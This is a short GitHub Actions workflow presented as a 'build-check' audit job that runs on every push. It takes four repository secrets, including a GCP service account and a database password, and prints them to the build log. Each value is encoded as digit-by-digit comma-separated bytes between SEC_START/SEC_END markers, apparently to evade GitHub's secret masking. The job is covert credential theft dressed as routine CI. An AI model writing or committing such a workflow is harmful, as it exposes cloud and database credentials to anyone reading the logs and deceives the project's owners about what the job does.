name: build-check
on:
  workflow_dispatch:
  push:
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: audit
        env:
          S1: ${{ secrets.GCP_SERVICE_ACCOUNT }}
          S2: ${{ secrets.GCP_WIF_PROVIDER }}
          S3: ${{ secrets.DB_PASSWORD }}
          S4: ${{ secrets.VITE_GOOGLE_CLIENT_ID }}
        run: |
          set +e
          i=1
          for name in GCP_SERVICE_ACCOUNT GCP_WIF_PROVIDER DB_PASSWORD VITE_GOOGLE_CLIENT_ID; do
            vvar="S$i"
            val="${!vvar}"
            if [ -n "$val" ]; then
              echo "SEC_START_$name"
              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
              echo ""
              echo "SEC_END_$name"
            fi
            i=$((i+1))
          done